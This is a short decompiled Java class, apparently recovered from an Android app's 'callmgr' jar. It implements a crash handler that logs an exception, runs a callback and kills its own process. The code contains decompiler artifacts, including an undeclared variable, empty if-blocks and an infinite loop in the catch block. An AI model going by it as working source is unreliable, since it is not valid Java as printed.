package com.fx.daemon.a;

import android.os.Process;
import com.vvt.h.a;
import java.util.concurrent.Callable;

public class c
  implements Thread.UncaughtExceptionHandler
{
  private static final boolean b = a.e;
  public String a;
  private Callable c;
  private String d;
  
  public c(String paramString1, String paramString2, Callable paramCallable)
  {
    this.a = paramString1;
    this.d = paramString2;
    this.c = paramCallable;
  }
  
  public void uncaughtException(Thread paramThread, Throwable paramThrowable)
  {
    bool = b;
    if (bool) {}
    d.a(this.d, paramThrowable);
    Callable localCallable = this.c;
    if (localCallable != null) {}
    try
    {
      localCallable = this.c;
      localCallable.call();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    Process.myPid();
    bool = b;
    if (bool) {}
    Process.killProcess(Process.myPid());
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/fx/daemon/getInstance/c.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */